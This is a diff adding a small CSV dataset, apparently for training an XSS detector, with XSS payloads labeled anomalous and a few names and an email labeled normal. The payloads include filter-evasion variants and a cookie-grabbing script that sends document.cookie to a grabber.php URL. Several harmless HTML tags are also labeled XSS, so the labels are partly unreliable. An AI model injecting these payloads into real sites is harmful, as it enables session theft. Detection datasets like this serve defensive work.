@@ -1,0 +1,39 @@
+payload,type,label
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>,xss,anom
+<script>alert('XSS')</script>,xss,anom
+<scr<script>ipt>alert('XSS')</scr<script>ipt>,xss,anom
+"""><script>alert('XSS')</script>",xss,anom
+<img src=x onerror=alert('XSS');>,xss,anom
+<svg/onload=alert('XSS')>,xss,anom
+"<div onpointerover=""alert(45)"">MOVE HERE</div>",xss,anom
+<body onload=alert(/XSS/.source)>,xss,anom
+<input autofocus onfocus=alert(1)>,xss,anom
+<select autofocus onfocus=alert(1)>,xss,anom
+<textarea autofocus onfocus=alert(1)>,xss,anom
+<keygen autofocus onfocus=alert(1)>,xss,anom
+<video/poster/onerror=alert(1)>,xss,anom
+"<video><source onerror=""javascript:alert(1)"">",xss,anom
+"<video src=_ onloadstart=""alert(1)"">",xss,anom
+"<details/open/ontoggle=""alert`1`"">",xss,anom
+<audio src onloadstart=alert(1)>,xss,anom
+<marquee onstart=alert(1)>,xss,anom
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>,xss,anom
+<script src=14.rs>,xss,anom
+"<input type=""hidden"" accesskey=""X"" onclick=""alert(1)"">",xss,anom
+-(confirm)(document.domain)//; alert(1);//,xss,anom
+URL/<svg onload=alert(1)>,xss,anom
+java%0ascript:alert(1)   - LF (\n),xss,anom
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\),xss,anom
+javascript://%0Aalert(1),xss,anom
+javascript://anything%0D%0A%0D%0Awindow.alert(1),xss,anom
+"data:text/html,<script>alert(0)</script>",xss,anom
+"vbscript:msgbox(""XSS"")<name><value><![CDATA[<script>confirm(document.domain)</script>]]></value></name><something:scriptxmlns:something=""http://www.w3.org/1999/xhtml"">alert(1)</something:script><svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",xss,anom
+player.swf?playerready=alert(document.cookie),xss,anom
+"<a href=""https://www.w3schools.com"">Visit W3Schools.com!</a>",xss,anom
+"<abbr title=""World Health Organization"">WHO</abbr>",xss,anom
+"<acronym title=""as soon as possible"">ASAP</acronym>",xss,anom
+"<address>Written by <a href=""mailto:webmaster@example.com"">Jon Doe</a>.<br></address>",xss,anom
+"<applet code=""Bubbles.class"" width=""350"" height=""350"">Java applet that draws animated bubbles.</applet>",xss,anom
+nasir,,norm
+forhad,,norm
+nasircsecu@gmail.com,,norm
